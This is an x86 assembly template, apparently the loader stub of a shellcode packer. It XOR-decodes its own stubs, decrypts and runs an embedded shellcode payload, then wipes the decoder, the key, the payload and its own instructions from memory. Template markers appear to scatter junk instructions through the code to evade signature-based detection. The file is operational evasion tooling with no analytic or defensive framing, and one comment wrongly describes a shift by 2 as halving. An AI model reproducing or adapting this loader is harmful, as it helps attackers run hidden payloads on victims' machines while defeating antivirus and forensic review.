.code32

entry:
  // save context and prepare the environment
  push ebx                                     // store ebx for save entry address
  push ebp                                     // store ebp for save stack address
  push esi                                     // store esi for save the last argument
  mov esi, [esp + 4*4]                         // save the last argument in stack
  {{db .SaveContext}}                          // save registers

  // calculate the entry address
  call calc_entry_addr
 flag_CEA:

  // save arguments for call shellcode
  push ecx
  push edx

  // decode instructions in stub and erase them
  call decode_stubs
  call decode_shellcode
  call erase_decoder_stub
  call erase_crypto_key_stub

 // erase useless functions and entry
 flag_eraser_1:
  lea ecx, [ebx + calc_entry_addr]         {{igi}}
  mov edx, eraser_stub - calc_entry_addr   {{igi}}
  call eraser_stub                         {{igi}}

  mov ecx, ebx                       {{igi}}
  mov edx, flag_eraser_1             {{igi}}
  call eraser_stub                   {{igi}}

  // restore arguments for call shellcode
  pop edx                            {{igi}}
  pop ecx                            {{igi}}

  // ensure stack is 16 bytes aligned
  push ebp                           {{igi}}
  mov ebp, esp                       {{igi}}
  mov eax, ebp                       {{igi}}
  and eax, 0x0F                      {{igi}}
  sub esp, eax                       {{igi}}

  // execute the shellcode
  push esi                           {{igi}}   // move the last argument to stack
  call shellcode_stub                {{igi}}   // call the shellcode

  // restore stack and ebp
  mov esp, ebp                       {{igi}}   // restore stack address
  pop ebp                            {{igi}}   // restore ebp

  // save the shellcode return value
  push eax                           {{igi}}

  // erase the shellcode stub
{{if .EraseShellcode}}
  lea ecx, [ebx + shellcode_stub]    {{igi}}
  mov edx, {{hex .ShellcodeLen}}     {{igi}}
  call eraser_stub                   {{igi}}
{{end}}

  // erase the above instructions
 flag_eraser_2:
  mov ecx, ebx                       {{igi}}
  // prevent appear three 0x00
  xor edx, edx                       {{igi}}
  add dx, flag_eraser_2 + 8          {{igi}}
  call eraser_stub                   {{igi}}

  // erase the eraser stub
  lea edi, [ebx + eraser_stub]       {{igi}}
  lea esi, [ebx + crypto_key_stub]   {{igi}}
  // prevent appear three 0x00
  xor ecx, ecx                       {{igi}}
  add cx, {{hex .EraserLen}}         {{igi}}
  cld                                {{igi}}
  rep movsb                          {{igi}}

  // restore the shellcode return value
  pop eax                            {{igi}}

  {{db .RestoreContext}}                       // restore registers
  pop esi                            {{igi}}   // restore esi
  pop ebp                            {{igi}}   // restore ebp
  pop ebx                            {{igi}}   // restore ebx
  ret                                {{igi}}   // return to the caller

calc_entry_addr:
  pop eax                                      // get return address
  mov ebx, eax                                 // calculate entry address
  sub ebx, flag_CEA                            // fix bug for assembler
  push eax                                     // push return address
  ret                                          // return to the entry

// ecx = data address, edx = data length, eax = key.
// this function assumes that the data length is divisible by 4.
mini_xor:
  shr edx, 2     // edx /= 2
  loop_xor:
  xor [ecx], eax
  add ecx, 4
  dec edx
  jnz loop_xor
  ret

decode_stubs:
  mov eax, {{hex .StubKey}}

  lea ecx, [ebx + decoder_stub]
  mov edx, eraser_stub - decoder_stub
  call mini_xor

  lea ecx, [ebx + eraser_stub]
  mov edx, crypto_key_stub - eraser_stub
  call mini_xor

  lea ecx, [ebx + crypto_key_stub]
  mov edx, shellcode_stub - crypto_key_stub
  call mini_xor
  ret

decode_shellcode:
  lea ecx, [ebx + shellcode_stub]
  mov edx, {{hex .ShellcodeLen}}
  mov eax, {{hex .CryptoKeyLen}}
  push eax
  lea eax, [ebx + crypto_key_stub]
  push eax
  call decoder_stub
  ret

erase_decoder_stub:
  lea ecx, [ebx + decoder_stub]
  mov edx, eraser_stub - decoder_stub
  call eraser_stub
  ret

erase_crypto_key_stub:
  lea ecx, [ebx + crypto_key_stub]
  mov edx, shellcode_stub - crypto_key_stub
  call eraser_stub
  ret

decoder_stub:
  {{db .DecoderStub}}                {{igi}}

eraser_stub:
  {{db .EraserStub}}                 {{igi}}

crypto_key_stub:
  {{db .CryptoKeyStub}}              {{igi}}

shellcode_stub:
